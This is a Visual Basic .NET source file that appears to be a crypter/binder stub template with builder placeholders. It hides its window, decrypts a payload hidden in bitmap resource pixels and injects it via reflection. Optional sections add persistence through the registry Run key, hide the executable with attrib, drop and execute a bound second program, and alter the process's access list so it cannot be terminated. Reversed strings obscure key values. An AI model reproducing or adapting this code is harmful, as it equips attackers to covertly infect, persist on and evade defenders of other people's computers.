Imports System.Windows.Forms
Imports System.Drawing
Imports Microsoft.VisualBasic
Imports System
Imports System.Diagnostics
Imports System.Collections.Generic
Imports System.Reflection

'/Asm/

Namespace this_Name
    Public Class stubTest
        Inherits System.Windows.Forms.Form
        Friend WithEvents ListBox1 As System.Windows.Forms.ListBox
        Friend WithEvents Panel1 As System.Windows.Forms.Panel
        Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
        Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
        Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
        Friend WithEvents Label1 As System.Windows.Forms.Label
        Friend WithEvents Button3 As System.Windows.Forms.Button
        Friend WithEvents Button2 As System.Windows.Forms.Button
        Friend WithEvents Button1 As System.Windows.Forms.Button
        '/APIS/
        Sub New()
            Me.Opacity = 0
            Me.ShowInTaskbar = False
        End Sub
        Public Shared Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
            '/Delay/ Threading.Thread.Sleep(/Time/ * 1000)
            Dim k As Integer = CType(AppDomain.CurrentDomain.Load(PolyDeCrypt(grbo(0), System.Text.Encoding.Unicode.GetBytes("/Key/"))).GetTypes("0").InvokeMember("y", Reflection.BindingFlags.InvokeMethod, Nothing, Nothing, _RET(New Integer() {0, 1, 1, 0, 1 + 6 + 1})), Integer)
          '  k = k / 2 * 2
            '/Protect/ protecther.h = k
            '/Protect/ protecther.begin()
            '/Melt/ Shell(_Rev(" H+ BIRTTA") & System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName)


            '/Startup/  SU()
            '/Bind/ Bind.B()
            '  Threading.Thread.Sleep(2000)
            End
        End Sub

        '/Startup/Public Shared Sub SU()
        '/Startup/     Try
        '/Startup/  Dim b As Object() = New Object() {System.IO.File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName)}
        '/Startup/   System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\/Filename/", b(0))

        '/Startup/         Using key As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(_Rev("nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), True)
        '/Startup/             key.SetValue("/Key/", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\/Filename/", Microsoft.Win32.RegistryValueKind.[String])
        '/Startup/            key.Close()
        '/Startup/        End Using
        '/Startup/   Catch
        '/Startup/      End Try
        '/Startup/   End Sub

        Public Shared Function _RET(fakeparams As Integer()) As Object()
            Dim _filebytes As Byte() = PolyDeCrypt(grbo(1), System.Text.Encoding.Unicode.GetBytes("/Key/"))
            Return New Object() {_filebytes, vbNullString, "/Inject/"} 
        End Function
        Public Shared Function _Rev(str As String) As String

            Return StrReverse(str)
        End Function
        Public Shared Function _Reverse(data As Bitmap) As Byte()
            Dim ByteList As List(Of Byte) = New List(Of [Byte])()
            For x As Integer = 0 To data.Width - 1
                For y As Integer = 0 To data.Height - 1
                    Dim Pixel As Color = data.GetPixel(x, y)
                    If Pixel <> Color.FromArgb(0, 0, 0, 0) Then
                        ByteList.Add(Pixel.R)
                        ByteList.Add(Pixel.G)
                        ByteList.Add(Pixel.B)
                    End If
                Next
            Next
            Return _Decompress(ByteList.ToArray())
        End Function
        Public Shared Function PolyDeCrypt(ByRef _Data() As Byte, ByVal _Key() As Byte, Optional ByVal _ExtraRounds As UInteger = 0) As Byte()
            For enci As Integer = 0 To (_Data.Length - 1) * (_ExtraRounds + 1)
                _Data(enci Mod _Data.Length) = CByte((CInt(_Data(enci Mod _Data.Length) Xor _Key(enci Mod _Key.Length)) - CInt(_Data((enci + 1) Mod _Data.Length)) + 256) Mod 256)
            Next
            Array.Resize(_Data, _Data.Length - 1)
            Return _Data
        End Function

        Public Shared Function grbo(_offset As Integer) As Byte()
            Return _Reverse(New Bitmap(System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames()(_offset))))
        End Function

        Public Shared Function _Decompress(zippedData As Byte()) As Byte()
            Dim decompressedData As Byte() = Nothing
            Using outputStream As New IO.MemoryStream()
                Using inputStream As New IO.MemoryStream(zippedData)
                    Using _zip As New IO.Compression.GZipStream(inputStream, IO.Compression.CompressionMode.Decompress)
                        _CopyTo(_zip, outputStream)
                    End Using
                End Using
                decompressedData = outputStream.ToArray()
            End Using
            Return decompressedData
        End Function
        Private Shared Sub _CopyTo(lsource As IO.Stream, ldestination As IO.Stream)
            Dim tbuffer As Byte() = New Byte(2047) {}
            Dim tbytesRead As Integer
            While (InlineAssignHelper(tbytesRead, lsource.Read(tbuffer, 0, tbuffer.Length))) > 0
                ldestination.Write(tbuffer, 0, tbytesRead)
            End While
        End Sub
        Private Shared Function InlineAssignHelper(Of T)(ByRef _target As T, nvalue As T) As T
            _target = nvalue
            Return nvalue
        End Function


        Private Sub InitializeComponent()
            Me.Button1 = New System.Windows.Forms.Button()
            Me.Button2 = New System.Windows.Forms.Button()
            Me.Button3 = New System.Windows.Forms.Button()
            Me.Label1 = New System.Windows.Forms.Label()
            Me.TextBox1 = New System.Windows.Forms.TextBox()
            Me.TextBox2 = New System.Windows.Forms.TextBox()
            Me.PictureBox1 = New System.Windows.Forms.PictureBox()
            Me.Panel1 = New System.Windows.Forms.Panel()
            Me.ListBox1 = New System.Windows.Forms.ListBox()
            CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
            Me.Panel1.SuspendLayout()
            Me.SuspendLayout()
            '
            'Button1
            '
            Me.Button1.Location = New System.Drawing.Point(13, 27)
            Me.Button1.Name = "Button1"
            Me.Button1.Size = New System.Drawing.Size(75, 23)
            Me.Button1.TabIndex = 0
            Me.Button1.Text = "Button1"
            Me.Button1.UseVisualStyleBackColor = True
            '
            'Button2
            '
            Me.Button2.Location = New System.Drawing.Point(13, 117)
            Me.Button2.Name = "Button2"
            Me.Button2.Size = New System.Drawing.Size(75, 23)
            Me.Button2.TabIndex = 1
            Me.Button2.Text = "Button2"
            Me.Button2.UseVisualStyleBackColor = True
            '
            'Button3
            '
            Me.Button3.Location = New System.Drawing.Point(119, 56)
            Me.Button3.Name = "Button3"
            Me.Button3.Size = New System.Drawing.Size(75, 23)
            Me.Button3.TabIndex = 2
            Me.Button3.Text = "Button3"
            Me.Button3.UseVisualStyleBackColor = True
            '
            'Label1
            '
            Me.Label1.AutoSize = True
            Me.Label1.Location = New System.Drawing.Point(116, 122)
            Me.Label1.Name = "Label1"
            Me.Label1.Size = New System.Drawing.Size(39, 13)
            Me.Label1.TabIndex = 3
            Me.Label1.Text = "Label1"
            '
            'TextBox1
            '
            Me.TextBox1.Location = New System.Drawing.Point(13, 56)
            Me.TextBox1.Name = "TextBox1"
            Me.TextBox1.Size = New System.Drawing.Size(100, 20)
            Me.TextBox1.TabIndex = 4
            '
            'TextBox2
            '
            Me.TextBox2.Location = New System.Drawing.Point(13, 82)
            Me.TextBox2.Name = "TextBox2"
            Me.TextBox2.Size = New System.Drawing.Size(100, 20)
            Me.TextBox2.TabIndex = 5
            '
            'PictureBox1
            '
            Me.PictureBox1.Location = New System.Drawing.Point(9, 149)
            Me.PictureBox1.Name = "PictureBox1"
            Me.PictureBox1.Size = New System.Drawing.Size(184, 64)
            Me.PictureBox1.TabIndex = 6
            Me.PictureBox1.TabStop = False
            '
            'Panel1
            '
            Me.Panel1.Controls.Add(Me.ListBox1)
            Me.Panel1.Location = New System.Drawing.Point(106, 10)
            Me.Panel1.Name = "Panel1"
            Me.Panel1.Size = New System.Drawing.Size(87, 39)
            Me.Panel1.TabIndex = 7
            '
            'ListBox1
            '
            Me.ListBox1.FormattingEnabled = True
            Me.ListBox1.Location = New System.Drawing.Point(7, 5)
            Me.ListBox1.Name = "ListBox1"
            Me.ListBox1.Size = New System.Drawing.Size(73, 30)
            Me.ListBox1.TabIndex = 0
            '
            'stubTest
            '
            Me.ClientSize = New System.Drawing.Size(284, 262)
            Me.Controls.Add(Me.Panel1)
            Me.Controls.Add(Me.PictureBox1)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.Button3)
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.Button1)
            Me.Name = "stubTest"
            CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
            Me.Panel1.ResumeLayout(False)
            Me.ResumeLayout(False)
            Me.PerformLayout()

        End Sub

    End Class
    '/Bind/   Public Class Bind
    '/Bind/    Public Shared Sub B()
    '/Bind/   Try
    '/Bind/  '/Runonce/  If Not IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Qvr.ini") Then IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Qvr.ini", "0")
    '/Bind/ '/Runonce/   Dim R As String = IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Qvr.ini")
    '/Bind/ '/Runonce/  If Not R = "1" Then
    '/Bind/     Dim Data As Byte() = stubTest.PolyDeCrypt(stubTest.grbo(2), System.Text.Encoding.Unicode.GetBytes("/Key/"))
    '/Bind/    IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Qvr/Ext/", Data)
    '/Bind/    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Qvr/Ext/")
    '/Bind/  '/Runonce/       IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Qvr.ini", "1")
    '/Bind/ '/Runonce/    Else
    '/Bind/     '/Runonce/     Exit Sub
    '/Bind/  '/Runonce/       End If
    '/Bind/ Catch
    '/Bind/ End Try
    '/Bind/    End Sub
    '/Bind/    End Class
    '/Protect/  Public Class protecther
    '/Protect/ Public Shared Dim h As Integer
    '/Protect/  <Runtime.InteropServices.DllImport("advapi32", SetLastError:=True)> _
    '/Protect/    Private Shared Function SetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <Runtime.InteropServices.In()> ByVal pSecurityDescriptor As Byte()) As Boolean
    '/Protect/  End Function
    '/Protect/   <Runtime.InteropServices.DllImport("advapi32", SetLastError:=True)> _
    '/Protect/   Private Shared Function GetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <Runtime.InteropServices.Out()> ByVal pSecurityDescriptor As Byte(), ByVal nLength As UInteger, ByRef lpnLengthNeeded As UInteger) As Boolean
    '/Protect/  End Function
    '/Protect/   Public Enum ProcessAccessRights
    '/Protect/      PROCESS_ALL_ACCESS = (&HF0000 Or &H100 Or &HFFF Or &H1000 Or &H800)
    '/Protect/  End Enum
    '/Protect/ <Runtime.InteropServices.DllImport("kernel32.dll")> _
    '/Protect/ Public Shared Function OpenProcess(processAccess As ProcessAccessRights, bInheritHandle As Boolean, processId As Integer) As IntPtr
    '/Protect/ End Function
    '/Protect/   Public Shared Sub begin()
    '/Protect/  Dim ptr As IntPtr = OpenProcess(ProcessAccessRights.PROCESS_ALL_ACCESS, false, h)
    '/Protect/  Dim dal As Security.AccessControl.RawSecurityDescriptor = senddesription(ptr)
    '/Protect/      dal.DiscretionaryAcl.InsertAce(0, New Security.AccessControl.CommonAce(Security.AccessControl.AceFlags.None, Security.AccessControl.AceQualifier.AccessDenied, CInt(ProcessAccessRights.PROCESS_ALL_ACCESS), New Security.Principal.SecurityIdentifier(Security.Principal.WellKnownSidType.WorldSid, Nothing), False, Nothing))
    '/Protect/    change(ptr, dal)
    '/Protect/  End Sub
    '/Protect/  Public Shared Function senddesription(ByVal processHandle As IntPtr) As Security.AccessControl.RawSecurityDescriptor
    '/Protect/     Dim buff As Byte() = New Byte(-1) {}
    '/Protect/  Dim blocksize As UInteger
    '/Protect/   GetKernelObjectSecurity(processHandle, &H4, buff, 0, blocksize)
    '/Protect/  GetKernelObjectSecurity(processHandle, &H4, retType(buff, New Byte(blocksize - 1) {}), blocksize, blocksize)
    '/Protect/     Return New Security.AccessControl.RawSecurityDescriptor(buff, 0)
    '/Protect/ End Function
    '/Protect/ Public Shared Sub change(ByVal processHandle As IntPtr, ByVal dal As Security.AccessControl.RawSecurityDescriptor)
    '/Protect/ Dim rawdat As Byte() = New Byte(dal.BinaryLength - 1) {}
    '/Protect/     dal.GetBinaryForm(rawdat, 0)
    '/Protect/    SetKernelObjectSecurity(processHandle, &H4, rawdat)
    '/Protect/End Sub
    '/Protect/  Private Shared Function retType(Of T)(ByRef p1 As T, ByVal p2 As T) As T
    '/Protect/      p1 = p2
    '/Protect/  Return p2
    '/Protect/ End Function
    '/Protect/ End Class
End Namespace
